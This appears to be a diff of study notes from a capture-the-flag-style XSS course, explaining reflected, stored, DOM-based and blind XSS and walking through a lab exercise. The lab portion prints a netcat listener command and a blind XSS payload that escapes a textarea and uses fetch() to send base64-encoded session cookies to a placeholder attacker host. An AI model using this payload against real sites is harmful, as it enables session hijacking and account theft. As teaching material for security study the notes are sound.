@@ -44,25 +44,9 @@ This payload is a lot more specific than the above examples. This would be about
 Reflected XSS happens when user-supplied data in an HTTP request is included in the webpage source without any validation.
 
 
-Example Scenario:
-
+## Example Scenario
 A website where if you enter incorrect input, an error message is displayed. The content of the error message gets taken from the error parameter in the query string and is built directly into the page source.
-
-
-
-
-
 The application doesn't check the contents of the error parameter, which allows the attacker to insert malicious code.
-
-
-
-
-
-
-
-The vulnerability can be used as per the scenario in the image below:
-
-
 
 Potential Impact:
 
@@ -76,5 +60,126 @@ Parameters in the URL Query String
 URL File Path
 Sometimes HTTP Headers (although unlikely exploitable in practice)
 Once you've found some data which is being reflected in the web application, you'll then need to confirm that you can successfully run your JavaScript payload; your payload will be dependent on where in the application your code is reflected (you'll learn more about this in task 6).
+
+## Stored XXS
+As the name infers, the XSS payload is stored on the web application (in a database, for example) and then gets run when other users visit the site or web page.
+
+Example Scenario:
+A blog website that allows users to post comments. Unfortunately, these comments aren't checked for whether they contain JavaScript or filter out any malicious code. If we now post a comment containing JavaScript, this will be stored in the database, and every other user now visiting the article will have the JavaScript run in their browser.
+
+Potential Impact:
+The malicious JavaScript could redirect users to another site, steal the user's session cookie, or perform other website actions while acting as the visiting user.
+
+How to test for Stored XSS:
+You'll need to test every possible point of entry where it seems data is stored and then shown back in areas that other users have access to; a small example of these could be:
+
+Comments on a blog
+User profile information
+Website Listings
+Sometimes developers think limiting input values on the client-side is good enough protection, so changing values to something the web application wouldn't be expecting is a good source of discovering stored XSS, for example, an age field that is expecting an integer from a dropdown menu, but instead, you manually send the request rather than using the form allowing you to try malicious payloads. 
+
+Once you've found some data which is being stored in the web application,  you'll then need to confirm that you can successfully run your JavaScript payload; your payload will be dependent on where in the application your code is reflected (you'll learn more about this in task 6).
+
+## DOM Based XXS
+
+What is the DOM?
+DOM stands for Document Object Model and is a programming interface for HTML and XML documents. 
+It represents the page so that programs can change the document structure, style and content. 
+A web page is a document, and this document can be either displayed in the browser window or as the HTML source. 
+A diagram of the HTML DOM is displayed below:
+
+# If you want to learn more about the DOM and gain a deeper understanding w3.org have a great resource.
+
+Exploiting the DOM
+DOM Based XSS is where the JavaScript execution happens directly in the browser without any new pages being loaded or data submitted to backend code. 
+Execution occurs when the website JavaScript code acts on input or user interaction.
+
+Example Scenario:
+The website's JavaScript gets the contents from the window.location.hash parameter and then writes that onto the page in the currently being viewed section. 
+The contents of the hash aren't checked for malicious code, allowing an attacker to inject JavaScript of their choosing onto the webpage.
+
+Potential Impact:
+Crafted links could be sent to potential victims, redirecting them to another website or steal content from the page or the user's session.
+
+How to test for Dom Based XSS:
+DOM Based XSS can be challenging to test for and requires a certain amount of knowledge of JavaScript to read the source code. 
+'d need to look for parts of the code that access certain variables that an attacker can have control over, such as "window.location.x" parameters.
+When you've found those bits of code, you'd then need to see how they are handled and whether the values are ever written to the web page's DOM or 
+passed to unsafe JavaScript methods such as eval().
+
+## Blind XXS
+Blind XSS is similar to a stored XSS (which we covered in task 4) in that your payload gets stored on the website for another user to view, but in this instance, you can't see the payload working or be able to test it against yourself first.
+
+Example Scenario:
+A website has a contact form where you can message a member of staff. The message content doesn't get checked for any malicious code, which allows the attacker to enter anything they wish. These messages then get turned into support tickets which staff view on a private web portal.
+
+Potential Impact:
+Using the correct payload, the attacker's JavaScript could make calls back to an attacker's website, revealing the staff portal URL, the staff member's cookies, and even the contents of the portal page that is being viewed. Now the attacker could potentially hijack the staff member's session and have access to the private portal.
+How to test for Blind XSS:
+
+When testing for Blind XSS vulnerabilities, you need to ensure your payload has a call back (usually an HTTP request). 
+This way, you know if and when your code is being executed.
+A popular tool for Blind XSS attacks is XSS Hunter Express. Although it's possible to make your own tool in JavaScript, t
+his tool will automatically capture cookies, URLs, page contents and more.
+
+Example:
+
+For the last task, we will go over a Blind XSS vulnerability. Ensure you terminate the previous machine and then click on the green Start Machine button on the right to load the Acme IT Support website. You’ll need to use the AttackBox using the blue button at the top of the page. Once loaded, open the link below inside the AttackBox’s Firefox browser to view the target website.
+
+https://10-10-59-102.p.thmlabs.com
+
+Click on the Customers tab on the top navigation bar and click the "Signup here" link to create an account. Once your account gets set up, click the Support Tickets tab, which is the feature we will investigate for weaknesses. 
+
+Try creating a support ticket by clicking the green Create Ticket button, enter the subject and content of just the word test and then click the blue Create Ticket button. You'll now notice your new ticket in the list with an id number which you can click to take you to your newly created ticket. 
+
+Like task three, we will investigate how the previously entered text gets reflected on the page. Upon viewing the page source, we can see the text gets placed inside a textarea tag.
+
+
+
+
+
+Let's now go back and create another ticket. Let's see if we can escape the textarea tag by entering the following payload into the ticket contents:
+
+</textarea>test
+
+Again, opening the ticket and viewing the page source, we've successfully escaped the textarea tag.
+
+
+
+
+
+Let's now expand on this payload to see if we can run JavaScript and confirm that the ticket creation feature is vulnerable to an XSS attack. Try another new ticket with the following payload:
+
+ </textarea><script>alert('THM');</script>
+
+Now when you view the ticket, you should get an alert box with the string THM. We're going to now expand the payload even further and increase the vulnerabilities impact. Because this feature is creating a support ticket, we can be reasonably confident that a staff member will also view this ticket which we could get to execute JavaScript. 
+
+Some helpful information to extract from another user would be their cookies, which we could use to elevate our privileges by hijacking their login session. To do this, our payload will need to extract the user's cookie and exfiltrate it to another webserver server of our choice. Firstly, we'll need to set up a listening server to receive the information.
+
+Using the AttackBox, let’s set up a listening server using Netcat. If we want to listen on port 9001, we issue the command nc -l -p 9001. The -l option indicates that we want to use Netcat in listen mode, while the -p option is used to specify the port number. To avoid the resolution of hostnames via DNS, we can add -n; moreover, to discover any errors, running Netcat in verbose mode by adding the -v option is recommended. The final command becomes nc -n -l -v -p 9001, equivalent to nc -nlvp 9001.
+
+nc
+user@machine$ nc -nlvp 9001
+Listening on [0.0.0.0] (family 0, port 9001)
+Now that we’ve set up the method of receiving the exfiltrated information, let’s build the payload.
+
+</textarea><script>fetch('http://URL_OR_IP:PORT_NUMBER?cookie=' + btoa(document.cookie) );</script>
+
+Let’s break down the payload:
+
+The </textarea> tag closes the text area field.
+The <script> tag opens an area for us to write JavaScript.
+The fetch() command makes an HTTP request.
+URL_OR_IP is either the THM request catcher URL, your IP address from the THM AttackBox, or your IP address on the THM VPN Network.
+PORT_NUMBER is the port number you are using to listen for connections on the AttackBox.
+?cookie= is the query string containing the victim’s cookies.
+btoa() command base64 encodes the victim’s cookies.
+document.cookie accesses the victim’s cookies for the Acme IT Support Website.
+</script>closes the JavaScript code block.
+Now create another ticket using the above payload, making sure to swap out the URL_OR_IP:PORT_NUMBER variables with your settings (make sure to specify the port number as well for the Netcat listener). Now, wait up to a minute, and you will see the request come through containing the victim’s cookies.
+
+Note: You may encounter issues with receiving the request using your own VM and the VPN. It is recommended you use the AttackBox for this task.
+
+You can now base64 decode this information using a site like https://www.base64decode.org/, giving you the necessary information to answer the below question.
 
 
